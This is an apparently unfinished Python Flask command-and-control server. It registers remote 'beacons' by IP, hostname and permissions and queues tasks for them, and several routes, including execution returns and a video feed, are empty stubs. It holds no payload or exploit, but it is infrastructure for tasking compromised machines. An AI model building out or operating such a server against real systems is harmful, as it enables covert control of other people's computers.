from flask import Flask, request, jsonify
from time import time
import ssl
import os
from bin.server.Classes import *
from werkzeug.exceptions import BadRequest
import uuid


app = Flask(__name__)

# Define the db in the future, for now we hardcode it and test
db_name = "monke"
db_id = "1"
db_key= "xyz"
db_config = "10"

agents= Agent(
    name=db_name,
    id= db_id,
    key=db_key,
    path= f"/home/exe/agents/{db_name.lower()}",     
    config= db_config
)

beacons = {}

def initial_setup():
    base_data_path = "/home/exe/data"
    subdirectories = ["beacons", "tasks", "logs"]

    if not os.path.exists (base_data_path):
        os.makedirs(base_data_path)

        for subdir in subdirectories:
            full_path = os.path.join(base_data_path, subdir)
            os.makedirs(full_path, exist_ok=True)
            print(f"[+]Created directories: {full_path}")


@app.route("/")
def web_root():
    return "<p>Hello!</p>"

@app.route("/c2/register_beacon", methods=['POST'])
def register_beacon_route():
    try:
        data = request.json
        if not data:
            raise BadRequest("No JSON data provided")   #Handle invalid data
        
        remote_ip = data.get('remote_ip')
        remote_hostname = data.get('remote_hostname')
        current_permission = data.get('remote_permissions')

        if not all([remote_ip, remote_hostname, current_permission]):
            return jsonify({"status": "failure", "message": "Some data is missing", "data": {}}), 400

        beacon_id = str(uuid.uuid4())
        beacon_path = os.path.join(agents.get_beacon_path(), f"{beacon_id}.txt")

        with open(beacon_path, "a") as f:
            f.write(f"{remote_hostname},{remote_ip},{current_permission}\n")

        beacons[beacon_id] = {"remote_ip": remote_ip, "remote_hostname": remote_hostname, "permissions": current_permission}

        return jsonify({
            "status": "success",
            "message": "Beacon registered successfully",
            "data": {"beacon_id": beacon_id}
        }), 200

    except BadRequest as e:
        return jsonify({"status": "failure", "message": f"Invalid JSON data: {str(e)}", "data": {}}), 400
    except PermissionError:
        return jsonify({"status": "failure", "message": "Permission denied while writing beacon data", "data": {}}), 403
    except FileNotFoundError:
        return jsonify({"status": "failure", "message": "Beacon file path not found", "data": {}}), 404
    except OSError as e:
        return jsonify({"status": "failure", "message": f"Failed to write beacon data: {str(e)}", "data": {}}), 500

@app.route("/c2/read_task", methods=['GET'])
def read_task_route():
    beacon_id = request.args.get('beacon_id')

    if not beacon_id or beacon_id not in beacons:
        return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404
    
    task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")

    if not os.path.exists(task_file):
        return jsonify({"status": "failure", "message": "Task file not found", "data": {}}), 404

    with open(task_file, "r") as f:
        tasks = f.readlines()

    return jsonify({
        "status": "success",
        "message": "Tasks fetched successfully",
        "data": {"tasks": tasks}
    }), 200

@app.route("/c2/write_task", methods=['POST'])
def write_task_route():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "failure", "message": "No JSON data provided", "data": {}}), 400

        beacon_id = data.get('beacon_id')
        task = data.get('task')

        if not beacon_id or not task:
            return jsonify({"status": "failure", "message": "Beacon ID or task is missing", "data": {}}), 400

        if beacon_id not in beacons:
            return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404

        task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")
        os.makedirs(os.path.dirname(task_file), exist_ok=True)

        with open(task_file, "a") as f:
            f.write(f"{task}\n")

        return jsonify({"status": "success", "message": "Task assigned successfully", "data": {}}), 200

    except OSError as e:
        return jsonify({"status": "failure", "message": f"Failed to assign task: {str(e)}", "data": {}}), 500

@app.route("/c2/return_execution_data", methods=['POST'])
def randomshit():
    pass

@app.route("/c2/write_pi_task", methods=['GET'])
def pistuff1():
    pass

@app.route("/c2/return_pi_execution_data", methods=['POST'])
def pistuff2():
    pass

@app.route("/c2/pi_video_feed")
def video_feed():
    pass

if __name__ == '__main__':
    base_data_path = "/home/exe/data"
    subdirectories = ["beacons", "tasks", "logs"]

    if not os.path.exists(base_data_path) or any(not os.path.exists(os.path.join(base_data_path, subdir)) for subdir in subdirectories):
        print("[!] Creating directories . . . ")
        initial_setup()

    app.run(host='0.0.0.0', port=80)
